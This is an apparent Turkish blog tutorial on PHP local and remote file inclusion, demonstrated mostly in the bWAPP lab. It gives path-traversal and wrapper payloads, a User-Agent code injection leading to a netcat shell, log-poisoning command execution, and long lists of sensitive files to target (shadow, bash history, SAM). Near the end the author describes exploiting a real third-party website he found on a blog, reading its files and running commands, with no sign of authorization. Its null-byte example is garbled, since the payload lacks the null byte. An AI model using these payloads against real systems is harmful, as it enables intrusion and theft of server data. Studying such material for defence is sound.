---
title: File Inclusion Muhabbetleri
description: File Inclusion Muhabbetleri
layout: Yazılar
permalink: file-inclusion-muhabbetleri
---

Eskiden çok daha meşhur çok daha fazla karşılaştığımız bir zafiyet türüdür.Yıl olmuş 2020 File Inclusion mu kaldı arkadaş diyenleri duyuyorum.Yılların bitiremediği ancak nadirleştirdiğini söyleyebiliriz..File Inclusion zafiyetleri hala oldukça ciddi sorunlara yol açmaktadır.Ciddi sistemlerde hala rastlanabilmektedir.Genel anlamda bu güvenlik açığının patch edilmesi basittir.

En çok ve en yaygın olarak php script dilinde görülen bir zafiyet türüdür.Bu zafiyet türü iki farklı şekilde karşımıza çıkmaktadır:

**A-Remote File Inclusion (RFI)**

**B-Local File Inclusion (LFI)**
<br><br>


<h3 style="color:yellow;">A-Remote File Inclusion (RFI)</h3>

**Remote File Inclusion (RFI)** uzaktan dosya dahil etme anlamına gelmektedir.Yerini **Local File Inclusion**’a bırakmıştır.Eskiden istemediğimiz kadar RFI açığını rastlıyorduk artık nadirinde nadiri şeklinde tanımlamak daha doğru olmakla birlikte php.ini dosyasında **“allow_url_include=Off”** şeklinde default geldiği için **RFI** bizimle değilsin diyoruz ve Local File Inclusiona geçiş yapıyoruz….
<br><br>

<h3 style="color:yellow;">B-Local File Inclusion (LFI)</h3>

**Local File Inclusion(LFI)** yerel dosya  dahil etme anlamına gelmektedir.**include,require,require_once,include_once** vs. PHP fonksiyonlarından kaynaklanır.Bizim kendi sistemimizde bulunan dosya ve dosyaların bizim isteğimiz dışında saldırgan kişiler tarafından çağrılmasıdır.Yani yazılımcının bir başka sayfayı siteye dahil etmeye çalışır.Saldırganlarda bu durumu istismar ederek isteği dosyaları okumaya çalışarak sistemi hacklemeye çalışır.



Saldırgan kişiler bu zafiyet sonucunda passwd ve config dosyalarını okuyabilmektedir.

Windows sistemlerde dizinler \ ile belirtilmektedir.**C:\Users\kursad\Documents** gibi….

Linux sistemlerde ise diziler / ile belirtilmektedir.  **/home/kursad/Desktop** gibi….

**LFI**  tespit ederken  **Linux serverlarda /etc/passwd** dosyasını , **Windowslarda c:\boot.ini** dosyasını include ederek tespit etmeye uğraşabilirsiniz.


Aşağıda **Local File Inclusion** zafiyeti bulunan bir kod bulunmaktadır.

<img src="https://1.bp.blogspot.com/-4587m3BWUCA/XlZ0hqkNwtI/AAAAAAAAASo/plTBfJ5n4csyqrdqh_n2Kzjvr3HWEH1dQCNcBGAsYHQ/s320/lfi1.jpg">

<br><br>


<h3 style="color:yellow;"> Web Uygulamalarında Local File Inclusion (LFI)  Nasıl Tespit Edilir ?</h3>

**Local File Inclusion** genelde kolay tespit edilebilen bir zafiyet türüdür.**LFI** zafiyeti her zaman hata verecek diye bir olay maalesef yok bazı durumlarda  hata ile karşılaşılmaz.Bunun içinde birkaç  püf noktaya bakacağız.
<br>

**Örnek** :İlk önce BWapp üzerinden low level örneğimize bakalım :
<br><br>

<img src="https://1.bp.blogspot.com/-5ETAi8CNxIo/XlZ1JvDYBEI/AAAAAAAAASw/kU1eIbxFcesfdhG5oG26_jzWdwX3GYUqwCNcBGAsYHQ/s640/lf2.jpg">
<br>
Bizden dil seçmemizi isteyen ufak bir bölüm gözümüze çarpıyor.Dilimizi seçip Go butonuna basıyoruz.
<br><br>
<img src="https://1.bp.blogspot.com/-vexPBAVKaYc/XlZ1t8XA84I/AAAAAAAAAS4/U98ArBqYQBk0raeyH4dfPaIIarY5eDy8ACNcBGAsYHQ/s640/lf3.jpg">
<br><br>
Yukarıda url de **rlfi.php?language=lang_en.php**   kısmında **lang_en.php**’i değiştirerek ekranda bir hata alıp alamayacağımıza bakalım: 

**rlfi.php?language=lang_en.php**  =>>   **rlfi.php?language=deneme** olarak değiştiriyoruz :

<img src="https://1.bp.blogspot.com/-DjBKRazA6_w/XlZ2PLNtHwI/AAAAAAAAATA/U49P2W5gosEO_1tqgak-ZVWqGIgP-wZKwCNcBGAsYHQ/s1600/lf4.jpg">

<br>

Yukarıda görüldüğü gibi ekrana hata bastı.Burada language parametresinden alınan verinin  **rlfi.php** ‘de include edildiğini anlıyoruz.
Zafiyetimizden yararlanma çabaları içerisine geçebiliriz.Genel olarak dosya konumu parametlerini değiştirerek zafiyetten yararlanmaya çalışılır.

Örnek verecek  olursak;  **/rlfi.php?language=../../../../../../../etc/passwd**  "../ " karakteri  bir alt dizine geçiş anlamına gelmektedir.İstediğimiz bir dosya için o klasöre geçmek gerekmektedir, bu işlemler için geçiş karakterleri kullanılır.
Yukarıdaki biçim **Unix/Linux** bir sistem olduğundan bu şekilde öncesinde de bu konudan bahsetmiştik.
<br><br>

<img src="https://1.bp.blogspot.com/-lICAck2k9DQ/XlaF_UDWo2I/AAAAAAAAATM/tV-gyhj1qXAaMVSIY-_a4OHYaVdpCLDyQCNcBGAsYHQ/s1600/lf5.jpg">

Yukarıda görüldüğü üzere **/rlfi.php?language=/etc/passwd** ile dosyamızı okuyabilidik...

<br><br>
Medium Level Örneğimizi İncelemeye Başlayabiliriz :
<img src="https://1.bp.blogspot.com/-6V7MpKrvaEo/XlaGvAWmQDI/AAAAAAAAATc/tR25qZqoNFYTgw-a5XxZ3eK79gFVnWfRACNcBGAsYHQ/s1600/lf5.5.jpg">


Yukarıda 2.Örneğimizde 1.Örneğe göre URL’de bir değişik olduğunu fark ediyoruz.Bu örnekte **“lang_en”** kısmına baktığımızda diğer örnektedeki gibi **“lang_en.php”** olmadığını gördük.
<br><br>
Basit düşünerek bir önceki örnekteki gibi hata almaya çalışalım :
<img src="https://1.bp.blogspot.com/-MvqibIdGkb4/XlaGdb3AeuI/AAAAAAAAATU/GeKCsz658AY_hLsTy1nLCpCAZyw4zjcmQCNcBGAsYHQ/s1600/lf5.5.1.jpg">
<br><br>
**/rlfi.php?language=deneme**  değişikliğimizi yaptık ve hatamızı aldık:
<img src="https://1.bp.blogspot.com/-M-VLPuMs3eM/XlaHAGcYRuI/AAAAAAAAATk/aDl8NN0oTQgxiKUa_O_Hn5JtZS_qga0iACNcBGAsYHQ/s1600/lf5.5.1.2.jpg">

Yukarıdaki hatamızda  include edilecek dosyanın sonuna **.php** uzantısının eklendiğini fark ediyoruz. Biz “deneme”  olarak bir gönderim yaptık.Böyle scriptler dosya sonlarına bu şekilde uzantılar ekliyorsa biz kafamıza göre dosya include edemeyeceğimizi anlıyoruz.

Bu tarz durumlarda  hataları gözardı etmemek gerekiyor.Neyin ne olduğunu anlamak gerekiyor.Burada **/etc/passwd** olarak deneme yaptığımızda da  kullanılan scriptten ötürü **/etc/passwd.php** olarak bize dönecektir.

Böyle durumlar için bazı yöntemler bulunmaktadır:

<br><br>

<h3 style="color:yellow;">NULL Byte Yöntemi</h3>
<br>
**Null byte** string sonlandırma karakteridir.C’de Null byte bir dizinin sonunu temsil eder , bundan dolayı NULL Byte’dan sonraki tüm karakterler yok sayılır.Yani scriptin eklediği **.php** gibi uzantıları görmezden gelir,yok sayar.Yukarıdaki örneğimizde Null Byte yöntemini kullanalım.

**Örnek kullanım :**

**/rlfi.php?language=/etc/passwd**

<br>

<img src="https://1.bp.blogspot.com/-NkwbKgDjw8E/XlaIial2H_I/AAAAAAAAATw/xyxmKRwTwO46yz9owvNnVkCvqkPd1ZYsgCNcBGAsYHQ/s1600/lf6.jpg">
<br>
<img src="https://1.bp.blogspot.com/-Y3HwGqkzMMo/XlaIzekNFxI/AAAAAAAAAT4/zqQh0HuTIwc4SD0DtCI4q9mOWzFlk0eKgCNcBGAsYHQ/s1600/lf7.jpg">
<br>
Yukarıda görüldüğü üzere **/etc/passwd**  okuyabildik.

<br>
<h3 style="color:yellow;">Truncation LFI Bypass Yöntemi</h3>

Lfi’in kaynaklandığı paramatre kısmına (lfi.php?language=) uzun bir parametre enjekte ettiğimizde web uygulaması filtresini atlatabiliriz :
<br>
**lfi.php?language=/etc/passwd…………………………………………………………………………….**

**lfi.php?language=../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd lfi.php?**

**language=/etc/passwd/../../../../../../../../../../../../../../../../../**

<br>

<h3 style="color:yellow;">PHP Wrapper’s</h3>

Php korumaları manasına gelmektedir.Php bulunan birkaç wrapperdan faydalanabiliriz.

Bunlar genellikle kötüye kullanıma sebep olmaktadır.Bunların aktif olup olmadığını deneyerek bulmamız gerekmektedir.

Daha çok ayrıntı için https://www.php.net/manual/en/wrappers.php.php incelemekte fayda var.
<br><br>
<h3 style="color:yellow;">PHP Expect</h3>

**PHP expect://** sistemde komut çalıştırılmasına izin verir , fakat modül default olarak  enabled değildir.

**php?page=expect://ls**
<br>
<h3 style="color:yellow;">PHP Filter</h3>

Burada  wrapper enabled durumda ise yanıt **base64** şeklindedir.Basitçe örneğimize bakalım :

**php://filter/convert.base64-encode/resource=** (Burada dosya içeriği base64 encode ediliyor.Bizde bunu decode edeceğiz.)

<br>
<img src="https://1.bp.blogspot.com/-O9pDAeg7-HA/XlaJuj8WpBI/AAAAAAAAAUI/0Qt8IPitgl8AG8OwNq15fxekP8bVUSRUACNcBGAsYHQ/s1600/LFI8.jpg">
<br>
<img src="https://1.bp.blogspot.com/-dE2gwhEVi3A/XlaJubZ6Q-I/AAAAAAAAAUE/jkFER-9B7Jw0d_gj96MGFCn5APw-v0X6ACNcBGAsYHQ/s1600/LF%25C4%25B09.jpg">
<br>
<img src="https://1.bp.blogspot.com/-PnjqAYFTils/XlaJuf1T-aI/AAAAAAAAAUA/phgoUGQETrsCkuoxRB62B6P4XCOd7X2EgCNcBGAsYHQ/s1600/LF%25C4%25B010.jpg">
<br>
Yukarıdaki örneğimizi incelediğimizde dönen base64'ü basit şekilde decode ettik.

<br><br>

<h3 style="color:yellow;">LFI ile  /proc/self/environ dalgası</h3>
<br>
**/proc**

Sistem belleği,süreçler,donanım  vs yapılandırmalı ile ilgili  bilgiler tutar.Bu klasördeki  dosyalar  gerektiği zaman sistemde değişiklikler yani ayarlamalar yapmak içinde kullanılır.

**/proc/self/environ**  ile hangi bilgiyi elde ederiz ;  anlık olarak sürecin environment bilgisini elde ederiz.

<br>

Basitçe Örneğimize  bakalım :

<br>

<img src="https://1.bp.blogspot.com/-0OygiJ0hwZ0/XluqG-ENzsI/AAAAAAAAAVQ/WM6K1sdoFqkJHapea36QfwnldyTRwhG6wCNcBGAsYHQ/s1600/LF%25C4%25B010.1.jpg">
<br>
yukarıdaki çıktıyı inceleyecek olursak  **/proc/self/environ** bize **serverın environment**'ını verecek yani sayfaya gelen kişinin bilgisi , yukarıda bizim bilgilerimiz gözükmektedir.Burada bizim dikkatimizi çeken kısım ise **HTTP_USER_AGENT** kısmı.Herhangi bir proxy aracı kullanarak ki ben burp kullanıyorum.**User-Agent** kısmına bir php kodu tanımlayıp, **/proc/self/environ**'u include ederek serverda komut çalıştırabiliriz.

<br>
<img src="https://1.bp.blogspot.com/-PV8ouuco2pc/XluqG4a8QFI/AAAAAAAAAVU/TVBjnkhf6C4Wp1x8vRr-3a57Yes2TZgngCNcBGAsYHQ/s1600/LF%25C4%25B011.jpg">


**User-Agent** kısmına  kodumumuzu tanımladık. **/proc/self/environu** include ederek komutumuzu çalıştırdık.

Şimdi **netcat** ile shell almaya çalışalım :

**User-Agent**  kısmına kodumuzu tanımlıyoruz.Tabi öncesinde netcat ile 4444 portumuzu dinlemeye alıyoruz sonrasında **GET** isteğimizi yolluyoruz:

<br>
<img src="https://1.bp.blogspot.com/-L59bQA56ge8/XluqHVCH1BI/AAAAAAAAAVY/6_JhZPEesVwe2_v6L0wAcNOrTvsVzkVIACNcBGAsYHQ/s1600/LF%25C4%25B013.jpg">
<br>
<img src="https://1.bp.blogspot.com/-6I0hf0PfFAg/XluqHlCpDEI/AAAAAAAAAVc/SQ0lBV8XT7YjypjFdPAjDNph2xIJZNBhwCNcBGAsYHQ/s1600/LF%25C4%25B014.jpg">
<br>
<img src="https://1.bp.blogspot.com/-6j7DDqHRJpk/XluqHr76EuI/AAAAAAAAAVg/ptHu7RkJJw8r0WQUA7O3OYakKf0Sx5i5gCNcBGAsYHQ/s1600/LF%25C4%25B015.jpg">
<br><br>
Yukarıda görüldüğü üzere başarılı şekilde bağlantımızı aldık...

Diyelim ki **/proc/self/environ** erişimimiz yok o zaman ne yapacağız? Bunuda bir hedef üzerinden ayrı bir konu olarak işlemeyi düşünüyorum.Önümüzdeki günlerde güzel bir anlatım şeklinde yazacağım.
<br><br>



<h3 style="color:yellow;">Log Injection Dalgası</h3>
<br>
Şimdi bir web servera istek yolladığımızı düşünelim.İsteğimiz şöyle olsun : 

**site.com/ <?php phpinfo(); ?>**


Bu isteği yolladığımızda böyle bir sayfa olmadığı için log dosyasında bir alt satıra bu isteğimizin detayları yazılacaktır.Bu muhabbetlerden ötürü bu log dosyalarına kod inject edip url üzerinden log dosyasını çağırarak kod çalıştırabiliriz.

Bizim için önenmli olan  log dosyalarının yollarını şöyle yazabiliriz :


Buradan da aşağıdaki dosyalara ulaşabilirsiniz.
<pre>
/etc/passwd
/etc/master.passwd
/etc/shadow
/var/db/shadow/hash
/etc/group
/etc/hosts
/etc/motd
/etc/issue
/etc/release
/etc/redhat-release
/etc/crontab
/etc/inittab
/proc/version
/proc/cmdline
/proc/self/environ
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/self/fd/255
/etc/httpd.conf
/etc/apache2.conf
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/apache2/conf/httpd.conf
/etc/apache/conf/httpd.conf
/usr/local/apache2/conf/httpd.conf
/usr/local/apache/conf/httpd.conf
/etc/apache2/sites-enabled/000-default
/etc/apache2/sites-available/default
/etc/nginx.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-available/default
/etc/nginx/sites-enabled/default
/etc/ssh/sshd_config
/etc/my.cnf
/etc/mysql/my.cnf
/etc/php.ini
/var/mail/www-data
/var/mail/www
/var/mail/apache
/var/mail/nobody
/var/www/.bash_history
/root/.bash_history
/var/root/.bash_history
/var/root/.sh_history
</pre>
<br><br>

<h3 style="color:yellow;">httpd.conf/php.ini</h3>
<br>
<pre>
/usr/local/apache/httpd.conf
/usr/local/apache2/httpd.conf
/usr/local/httpd/conf/httpd.conf
/usr/local/etc/apache/conf/httpd.conf
/usr/local/etc/apache2/conf/httpd.conf
/usr/local/etc/httpd/conf/httpd.conf
/usr/apache2/conf/httpd.conf
/usr/apache/conf/httpd.conf
/etc/http/conf/httpd.conf
/etc/http/httpd.conf
/opt/apache/conf/httpd.conf
/opt/apache2/conf/httpd.conf
/var/www/conf/httpd.conf
/usr/local/php/httpd.conf
/usr/local/php4/httpd.conf
/usr/local/php5/httpd.conf
/etc/httpd/php.ini
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/etc/php.ini
/usr/local/lib/php.ini
/usr/local/php/lib/php.ini
/usr/local/php4/lib/php.ini
/usr/local/php5/lib/php.ini
/usr/local/apache/conf/php.ini
/etc/php4/apache/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php5/apache2/php.ini
/etc/php/php.ini
/etc/php/php4/php.ini
/etc/php/apache/php.ini
/etc/php/apache2/php.ini
/usr/local/Zend/etc/php.ini
/opt/xampp/etc/php.ini
/var/local/www/conf/php.ini
/etc/php/cgi/php.ini
/etc/php4/cgi/php.ini
/etc/php5/cgi/php.ini
</pre>
<br><br>
<h3 style="color:yellow;">HTTPD LOG Dosyaları</h3>
<br>
<pre>
/var/log/access.log
/var/log/access_log
/var/log/error.log
/var/log/error_log
/var/log/apache2/access.log
/var/log/apache2/access_log
/var/log/apache2/error.log
/var/log/apache2/error_log
/var/log/apache/access.log
/var/log/apache/access_log
/var/log/apache/error.log
/var/log/apache/error_log
/var/log/httpd/access.log
/var/log/httpd/access_log
/var/log/httpd/error.log
/var/log/httpd/error_log
/etc/httpd/logs/access.log
/etc/httpd/logs/access_log
/etc/httpd/logs/error.log
/etc/httpd/logs/error_log
/usr/local/apache/logs/access.log
/usr/local/apache/logs/access_log
/usr/local/apache/logs/error.log
/usr/local/apache/logs/error_log
/usr/local/apache2/logs/access.log
/usr/local/apache2/logs/access_log
/usr/local/apache2/logs/error.log
/usr/local/apache2/logs/error_log
/var/www/logs/access.log
/var/www/logs/access_log
/var/www/logs/error.log
/var/www/logs/error_log
/opt/lampp/logs/access.log
/opt/lampp/logs/access_log
/opt/lampp/logs/error.log
/opt/lampp/logs/error_log
/opt/xampp/logs/access.log
/opt/xampp/logs/access_log
/opt/xampp/logs/error.log
/opt/xampp/logs/error_log
</pre>
<br><br>
<h3 style="color:yellow;">OS Logs</h3>
<br>
<h4 style="color:yellow;">- Linux</h4>
<pre>
/var/log/lastlog
/var/log/wtmp
/var/run/utmp
/var/log/messages.log
/var/log/messages
/var/log/messages.0
/var/log/messages.0.gz
/var/log/messages.1
/var/log/messages.1.gz
/var/log/messages.2
/var/log/messages.2.gz
/var/log/messages.3
/var/log/messages.3.gz
/var/log/syslog.log
/var/log/syslog
/var/log/syslog.0
/var/log/syslog.0.gz
/var/log/syslog.1
/var/log/syslog.1.gz
/var/log/syslog.2
/var/log/syslog.2.gz
/var/log/syslog.3
/var/log/syslog.3.gz
/var/log/auth.log
/var/log/auth.log.0
/var/log/auth.log.0.gz
/var/log/auth.log.1
/var/log/auth.log.1.gz
/var/log/auth.log.2
/var/log/auth.log.2.gz
/var/log/auth.log.3
/var/log/auth.log.3.gz
</pre>
<br><br>


<h4 style="color:yellow;">- Solaris</h4>
<pre>
/var/log/authlog
/var/log/syslog
/var/adm/lastlog
/var/adm/messages
/var/adm/messages.0
/var/adm/messages.1
/var/adm/messages.2
/var/adm/messages.3
/var/adm/utmpx
/var/adm/wtmpx
</pre>
<br><br>

<h4 style="color:yellow;">- Mac</h4>
<pre>
/var/log/kernel.log
/var/log/secure.log
/var/log/mail.log
/var/run/utmp
/var/log/wtmp
/var/log/lastlog
</pre>
<br><br>

<h3 style="color:yellow;">Windows Files</h3>
<br><br>

<h4 style="color:yellow;">-Fingerprinting</h4>
<pre>
*:\boot.ini
*:\WINDOWS\win.ini
*:\WINNT\win.ini
*:\WINDOWS\Repair\SAM
*:\WINDOWS\php.ini
*:\WINNT\php.ini
*:\Program Files\Apache Group\Apache\conf\httpd.conf
*:\Program Files\Apache Group\Apache2\conf\httpd.conf
*:\Program Files\xampp\apache\conf\httpd.conf
*:\php\php.ini
*:\php5\php.ini
*:\php4\php.ini
*:\apache\php\php.ini
*:\xampp\apache\bin\php.ini
*:\home2\bin\stable\apache\php.ini
*:\home\bin\stable\apache\php.ini
</pre>
<br><br>

<h4 style="color:yellow;">- Logs</h4>

<pre>
*:\Program Files\Apache Group\Apache\logs\access.log
*:\Program Files\Apache Group\Apache\logs\error.log
</pre>


<h4 style="color:yellow;">- PHP Session Locations</h4>

<pre>
*:\WINDOWS\TEMP\
*:\php\sessions\
*:\php5\sessions\
*:\php4\sessions\
</pre>
<br><br><br>

**Httpd.conf** dosyası bizim için önemlidir çünkü  genelde log dosyaları hakkında bilgiler tutar.Zafiyetli bir web sayfasına denk geldim bloğun birinde, örnek olsun diye konuya dahil ediyorum :
<br>
<img src="https://1.bp.blogspot.com/-JU9P38F3F_0/XpRvDFDdRUI/AAAAAAAAAWA/yeR5MBdtT-USR80zhj-rLZZ-OJJn1cFGwCNcBGAsYHQ/s1600/1.png">
<br><br>
Evet basitçe "/etc/passwd/"  okuyabiliyoruz :
<img src="https://1.bp.blogspot.com/-p-aBD-82m7k/XpRvB430yJI/AAAAAAAAAV8/YHEx34TL_ww4TfUnX2ikOdnjpAMQyiIYgCNcBGAsYHQ/s1600/2.png">
<br><br>
şöyle olmayan bir sayfa verelim ve isteğimiz hata ile karşılaşsın log dosyasında bu isteğimizi görelim:

**<?php phpinfo(); ?>**  kodumuzu yolladın ve 404 döndü devam edelim.

<img src="https://1.bp.blogspot.com/-VECeoTZh_ng/XpRyKJCidKI/AAAAAAAAAWQ/m6eB2FHnWswYewB5sPU8hGQnjT94ZqwHQCNcBGAsYHQ/s1600/3.jpg">
<br><br>

**httpd.conf** dosyasını okuyoruz ve log dosyaları ile ilgili bilgileri görüyoruz :

<img src="https://1.bp.blogspot.com/-JFeYY_XxvwY/XpRz20qGZbI/AAAAAAAAAWc/8r5tctgyD7sIJNTR3n9lQ6sAj3ymNhy5gCNcBGAsYHQ/s1600/4.jpg">
<br><br>

**access_log** dosyasını okuyoruz bir önceki aldığımız hata log dosyasına görüldüğü üzere işlenmiş durumda..
<img src="https://1.bp.blogspot.com/-xRbk39B2BNU/XpR3t2dT-_I/AAAAAAAAAWo/bc8bJVsYBI8od9cDnX_v_AkQqK5OilvPgCNcBGAsYHQ/s1600/5.jpg">
<br><br>

**&cmd=ls**  url üzerinden komutumuzu çalıştırabiliyoruz
<img src="https://1.bp.blogspot.com/-7Z8qqqYU40k/XpR6UuoilEI/AAAAAAAAAW0/hqQ_l9aJrK8Hc4-ZmWZ3WCs74nfLsed1gCNcBGAsYHQ/s1600/5.jpg">
<br><br>
vs vs vs...

Bu konu üzerinden file inclusion zafiyetine denk geldiğim yerleri sürekli olarak paylaşmaya çalışacağım...

